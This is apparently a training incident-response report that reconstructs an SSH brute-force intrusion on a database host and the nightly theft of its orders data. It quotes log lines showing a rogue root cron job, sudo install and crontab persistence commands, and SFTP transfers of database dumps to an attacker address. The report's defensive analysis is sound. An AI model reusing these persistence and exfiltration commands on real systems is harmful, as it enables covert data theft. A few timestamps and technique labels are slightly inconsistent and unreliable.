# Part 1: Incident Analysis & Reconstruction
**Host:** db01 | **Asset at Risk:** PostgreSQL `orders` database and nightly backups | **Capture Period:** 2 February 2026 00:00:00 UTC to 3 May 2026 00:00:00 UTC (90 days)  
**Log Sources:** `group30/auth.log` (12,757 lines) and `group30/daemon.log` (7,964 lines) | **Log Set:** Group 30 (Group AD)

---

### 1. Methodology and Event Classification Rules

To investigate the security posture of database host `db01` at Solstice Continental, we programmatically parsed the raw system logs `group30/auth.log` (12,757 lines) and `group30/daemon.log` (7,964 lines), spanning 2 February to 2 May 2026 inclusive (90-day capture). All event counts, network addresses, and temporal sequences in this report originate strictly from programmatic analysis of these two log files.

We operate under the following baseline assumptions and classification criteria:
* **Temporal and Logging Baselines:** Standard syslog timestamps omit the calendar year; we resolve this as 2026 by matching days of the week and date intervals. All recorded timestamps are evaluated in UTC, unaffected by daylight-saving boundaries. System daemon clocks (sshd, pam, sudo, cron) are assumed to be synchronized.
* **Network Boundary Definition:**
  * *Internal Network (`10.50.0.0/16`):* Addresses prefixed with `10.50.` represent corporate workstations and internal infrastructure. These hosts exhibit regular, high-frequency successful authentications (160 to 197 accepted sessions per host over 90 days) with low, sporadic failure counts (5 to 17), consistent with routine typographical mistakes.
  * *Authorized External Range (`198.51.100.0/24`):* Four external addresses (`198.51.100.54`, `198.51.100.125`, `198.51.100.212`, and `198.51.100.68`) belong to pre-authorized third-party business partners and remote employees connecting exclusively during core business hours (09:00 to 15:59 UTC). Consequently, an external IP address is not inherently malicious.
  * *Hostile External Origin:* Source IP `203.0.113.92` represents an unallocated, unauthenticated external entity with no authorized relationship to Solstice Continental.
* **Activity Triage Rules:**
  * **Normal Activity:** SSH authentications originating from `10.50.` or known contractor ranges within business hours; low failure rates ($\le 17$ per 90 days); regular scheduled operational data transfers (e.g. `orders-report` delivering exports to internal host `10.50.1.5:reports`).
  * **Suspicious Activity:** Probing non-existent system usernames (`Invalid user`); multi-account credential spraying ($\ge 3$ distinct accounts probed within an hour); sustained single-account guessing ($\ge 10$ failures/hour); or access attempts occurring during off-hours (00:00–05:00 UTC).
  * **Serious Activity:** Successful authentication directly following anomalous failure bursts; unauthorized privilege elevation (`sudo`) executed by external or service accounts; replacement of root administrative tasks (`crontab`); or database exports egressing to an unauthorized external IP.

---

### Table A: Source Summary Table
*Aggregated authentication attempts across all 17 connecting source IP addresses over the 90-day capture period (sorted by failed authentications descending; presented in a multi-column format to fit the 1.5-page layout).*

| Source Address | Scope | Failed | Accepted | Source Address | Scope | Failed | Accepted | Source Address | Scope | Failed | Accepted |
| :--- | :--- | :---: | :---: | :--- | :--- | :---: | :---: | :--- | :--- | :---: | :---: |
| **203.0.113.92** | External | **225** | **1** | **10.50.1.16** | Internal | 11 | 197 | **10.50.1.10** | Internal | 5 | 168 |
| **10.50.1.20** | Internal | 17 | 180 | **10.50.1.21** | Internal | 11 | 196 | **198.51.100.54** | External | 2 | 33 |
| **10.50.1.12** | Internal | 13 | 174 | **10.50.1.17** | Internal | 10 | 177 | **198.51.100.125** | External | 1 | 28 |
| **10.50.1.14** | Internal | 13 | 196 | **10.50.1.19** | Internal | 10 | 181 | **198.51.100.212** | External | 0 | 18 |
| **10.50.1.15** | Internal | 13 | 163 | **10.50.1.18** | Internal | 9 | 168 | **198.51.100.68** | External | 0 | 26 |
| **10.50.1.11** | Internal | 11 | 187 | **10.50.1.13** | Internal | 8 | 160 | **Total** | — | **359** | **2,253** |

---

### 2. Incident Reconstruction: Chronological Narrative

Across the 90-day logging window, `db01` processed 2,612 total authentication attempts (359 failed, 2,253 accepted). While 16 legitimate sources accounted for modest typing errors, a single hostile external IP, **`203.0.113.92`**, generated **225 of the 359 failed logins (62.7%)** and orchestrated a structured, four-phase intrusion:

1. **Reconnaissance & Account Enumeration (9 March):**  
   At 01:26:22 UTC, `203.0.113.92` initiated an automated probe against `db01` (`auth.log:4657`). Over 5 minutes and 23 seconds, the attacker tested 8 common administrative and service usernames (`webmaster`, `demo`, `testuser`, `deploy`, `test`, `oracle`, `guest`, `administrator`). Each username was tested exactly 3 times before connection termination (`[preauth]`), totaling 24 failed attempts (`auth.log:4657–4726`). All 8 were rejected as non-existent users, confirming active reconnaissance to map active accounts.

2. **Low-and-Slow Credential Spraying (10 March):**  
   Between 21:26:23 and 22:28:00 UTC, the adversary pivoted to password spraying across 7 valid corporate accounts: `iross`, `cwong`, `dsmith`, `gli`, `fjones`, `amurray`, and the remote maintenance account `hvac-remote-30`. The attack executed in 3 discrete rounds spaced exactly 30 minutes (1,800 seconds) apart (`auth.log:5099–5141`), with each account tested once per round (21 attempts total). The deliberate 1,800-second pause reflects an intentional evasion tactic to remain beneath automated threshold alerts. Although all attempts failed, the adversary confirmed the existence of `hvac-remote-30`.

3. **Targeted Brute-Force & Initial Access (12 March):**  
   At 00:26:23 UTC, the attacker launched an intensive brute-force assault focused exclusively on `hvac-remote-30` (`auth.log:5331`). In 21 minutes and 14 seconds, the adversary executed **180 failed password guesses across 60 rapid SSH connections** (averaging 7 seconds per attempt; `auth.log:5331–5690`). Host `db01` had no account lockout or connection-throttling mechanism. At **00:47:37 UTC**, the attacker submitted the correct credential and gained interactive shell access (`auth.log:5691–5692`).  
   *Baseline Anomaly:* Over the entire 90 days, the legitimate HVAC vendor logged in exclusively from static IP `198.51.100.68` during working hours (09:00 to 15:59 UTC, 26 logins) and had never invoked `sudo`. An off-hours login from an untrusted IP was an unprecedented anomaly.

4. **Privilege Escalation & Backdoor Installation (12 March):**  
   Within 5 minutes of entry, the adversary exploited excessive `sudo` privileges configured for `hvac-remote-30`. At 00:52:37 UTC, root permissions were confirmed via `sudo /usr/bin/id` (`auth.log:5693`). At 00:53:52 UTC, the attacker deployed `sudo /usr/bin/install` to promote a hidden payload (`/var/tmp/.maint-30`) to root executable `/usr/local/sbin/orders-sync-30` (`auth.log:5696`). At 00:55:22 UTC, root persistence was finalized via `sudo /usr/bin/crontab -u root /var/tmp/.schedule-30` (`auth.log:5699`), successfully overwriting root's cron schedule (`daemon.log:3198`). The intruder exited at 01:32:37 UTC (`auth.log:5701`), establishing permanent root-level control in just 7.8 minutes.

5. **Automated Exfiltration of Database Assets (13 March – 2 May):**  
   The rogue root cron job activated nightly at 03:39:00 UTC (`daemon.log:3289`). On its first execution on 13 March, `/usr/local/sbin/orders-sync-30`:
   - Extracted a live PostgreSQL database dump: `database dump completed database=orders bytes=486,155,249 status=0` (`daemon.log:3292`).
   - Read the server's official daily backup: `file=/var/backups/orders/orders-2026-03-13.dump bytes=485,598,893 status=0` (`daemon.log:3293`).
   - Packaged both files into an uncompressed archive `/var/tmp/.orders-30/orders-20260313.tar` (971,765,760 bytes; `daemon.log:3294`).
   - Exfiltrated the archive via SFTP to `sftp://203.0.113.92/drop/30` (`daemon.log:3295`).

   This automated cycle ran without failure or detection for **51 consecutive nights**, completing its final captured run on 2 May at 03:48:52 UTC (`daemon.log:7896`). Over the incident lifetime, the attacker exfiltrated **50,136,893,440 bytes (~46.69 GiB)** of sensitive customer data and redundant backups. Meanwhile, the legitimate contractor continued logging in from `198.51.100.68` 15 times after the breach during daytime hours (last recorded 30 April; `auth.log:20966`), demonstrating that the vendor remained unaware of the compromised credential.

---

### Table 1: Incident Facts (2026, UTC)
*Core forensic milestones establishing the breach timeline, with verbatim log evidence and line references.*

| Incident Fact | Value / Time (UTC) | Verbatim Proving Log Entry | Log Line Reference |
| :--- | :--- | :--- | :--- |
| **Attacker Source IP** | `203.0.113.92` | `Invalid user webmaster from 203.0.113.92 port 47399` | `auth.log:4657` |
| **First Access Attempt** | 2026-03-09 01:26:22 | `Invalid user webmaster from 203.0.113.92 port 47399` | `auth.log:4657` |
| **Compromised Account** | `hvac-remote-30` | `pam_unix(sshd:session): session opened for user hvac-remote-30(uid=1100) by (uid=0)` | `auth.log:5692` |
| **First Successful Login** | 2026-03-12 00:47:37 | `Accepted password for hvac-remote-30 from 203.0.113.92 port 37122 ssh2` | `auth.log:5691` |
| **Privilege Escalation** | 2026-03-12 00:52:37 | `sudo: hvac-remote-30 : TTY=pts/0 ; PWD=/home/hvac-remote-30 ; USER=root ; COMMAND=/usr/bin/id` | `auth.log:5693` |
| **Persistence Established** | 2026-03-12 00:55:23 | `crontab[10145]: (root) REPLACE (root)` | `daemon.log:3198` |
| **Customer Data Compromise** | 2026-03-13 03:48:32 to 2026-05-02 03:48:52 | `orders-sync[10389]: database dump completed job=sync-30-20260313 database=orders ... status=0` (last run at line 7896) | `daemon.log:3292` to `daemon.log:7896` |

---

### Table 2: Chronological Attack Chain Across Logs
*Reconstruction of the 12 sequential operational stages mapped to the MITRE ATT&CK enterprise matrix.*

| # | Timestamp (UTC) | Log File & Line | Log Line Excerpt | MITRE ATT&CK Technique | Forensic Interpretation |
| :-: | :--- | :--- | :--- | :--- | :--- |
| **1** | Mar 09 01:26:22 | `auth.log:4657` | `Invalid user webmaster from 203.0.113.92 port 47399` | **T1110.004** (Account Exhaustion) | External enumeration of 8 invalid usernames; all rejected by sshd. |
| **2** | Mar 10 21:27:59 | `auth.log:5111` | `Failed password for hvac-remote-30 from 203.0.113.92 port 58585 ssh2` | **T1110.003** (Password Spraying) | Low-and-slow probing of 7 valid accounts in 3 cycles spaced 30 min apart. |
| **3** | Mar 12 00:26:23 | `auth.log:5331` | `Failed password for hvac-remote-30 from 203.0.113.92 port 40379 ssh2` | **T1110.001** (Password Guessing) | High-speed brute-force attack: 180 failures in 21 minutes without throttling. |
| **4** | Mar 12 00:47:37 | `auth.log:5691` | `Accepted password for hvac-remote-30 from 203.0.113.92 port 37122 ssh2` | **T1078.003** (Local Accounts) | Initial foothold: password authentication succeeds from external hostile IP. |
| **5** | Mar 12 00:53:52 | `auth.log:5696` | `sudo: hvac-remote-30 : ... COMMAND=/usr/bin/install -o root -g root -m 0750 /var/tmp/.maint-30 /usr/local/sbin/orders-sync-30` | **T1548.003** (Sudo Elevation) / **T1036** (Masquerading) | Binary dropped to `/var/tmp/.maint-30` is installed into root system path. |
| **6** | Mar 12 00:55:23 | `daemon.log:3198` | `crontab[10145]: (root) REPLACE (root)` | **T1053.003** (Scheduled Task: Cron) | Root persistence achieved via `crontab -u root` (`auth.log:5699`). |
| **7** | Mar 13 03:39:00 | `daemon.log:3289` | `CRON[10388]: (root) CMD (/usr/local/sbin/orders-sync-30 --database orders --include-backups ... sftp://203.0.113.92/drop/30)` | **T1053.003** (Cron Execution) | Scheduled execution: rogue script triggers against database and backups. |
| **8** | Mar 13 03:48:32 | `daemon.log:3292` | `orders-sync[10389]: database dump completed job=sync-30-20260313 database=orders ... bytes=486155249 status=0` | **T1005** (Data from Local System) | Live PostgreSQL database dumped to staging directory. |
| **9** | Mar 13 03:48:37 | `daemon.log:3293` | `orders-sync[10389]: backup read completed job=sync-30-20260313 file=/var/backups/orders/orders-2026-03-13.dump bytes=485598893 status=0` | **T1005** (Data from Local System) | Nightly database backup harvested from local storage. |
| **10** | Mar 13 03:48:42 | `daemon.log:3294` | `orders-sync[10389]: archive completed ... file=/var/tmp/.orders-30/orders-20260313.tar bytes=971765760 status=0` | **T1560.001** (Archive via Utility) | Dump and backup combined into a single 971 MB tarball for staging. |
| **11** | Mar 13 03:51:25 | `daemon.log:3295` | `orders-sync[10389]: transfer completed ... destination=sftp://203.0.113.92/drop/30 bytes=971765760 status=0` | **T1048.002** (Exfiltration Over SFTP) | First successful exfiltration of 971 MB package to external attacker server. |
| **12** | May 02 03:48:52 | `daemon.log:7896` | `orders-sync[21374]: transfer completed job=sync-30-20260502 ... destination=sftp://203.0.113.92/drop/30 bytes=992071680 status=0` | **T1048.002** (Sustained Exfiltration) | Final logged run: 51st continuous extraction; active until logging ended. |

---

### 3. Alternative Explanations and Evidentiary Limitations

#### 3.1 Evaluation and Rejection of Alternative Hypotheses
We evaluated the hypothesis that this activity represented legitimate emergency off-hours maintenance by an authorized HVAC technician. This hypothesis is conclusively refuted by five empirical observations:
1. **Source Subnet Inconsistency:** The genuine supplier connected exclusively from static IP `198.51.100.68` across 26 documented sessions. The 12 March session originated from `203.0.113.92`, an address never previously seen in corporate records.
2. **Preceding Attack Signatures:** Genuine maintenance logins never generated authentication failures (0 failures in 26 visits). Conversely, the 12 March entry occurred only after 180 rapid password failures (spaced 7 seconds apart) following prior username enumeration.
3. **Privilege Abuse Profile:** Over 90 days of normal operations, `hvac-remote-30` never once executed `sudo`. During the intrusion, the session invoked `sudo` within 5 minutes to verify root (`id`), install rogue binaries, and overwrite root's crontab.
4. **Data Exfiltration vs. Operational Reporting:** Genuine business reports (`orders-report`) transfer data strictly to internal server `10.50.1.5:reports` (65 logged transfers). In contrast, `orders-sync-30` sent full database dumps and backups to external IP `203.0.113.92`.
5. **Contractor Obliviousness:** Following the breach, the legitimate contractor continued logging in from `198.51.100.68` 15 times during regular working hours (last seen 30 April). No password change or security report was made, proving the vendor was entirely unaware that their credentials had been compromised.

#### 3.2 Limitations of the Log Evidence
Forensic boundaries must be acknowledged regarding what the evidence cannot prove:
1. **Unlogged Password Content:** Standard Linux PAM and OpenSSH configurations never record password strings. We cannot determine whether the credential was guessed via dictionary, derived from a pattern, or replayed from a third-party leak.
2. **Origin of Harvested Usernames:** The logs do not explain how the adversary acquired the valid usernames targeted on 10 March. Unlogged potential vectors include external phishing, LinkedIn employee harvesting, or a prior breach of the contractor's internal systems.
3. **Local Log Integrity & Root Tamper Risk:** Host `db01` stored logs locally without remote write-once forwarding (SIEM/WORM). Having obtained root at 00:52 UTC, the attacker had the technical capability to truncate, edit, or delete `/var/log/auth.log` and `/var/log/daemon.log`. While intact incriminating lines demonstrate the attacker did not scrub the logs, selective tampering cannot be strictly ruled out.
4. **Perimeter and Endpoint Blind Spots:** The telemetry covers a single server (`db01`). The absence of firewall logs, NetFlow, or contractor endpoint data prevents observation of network-level command-and-control infrastructure or lateral movement to other hosts on `10.50.0.0/16`.
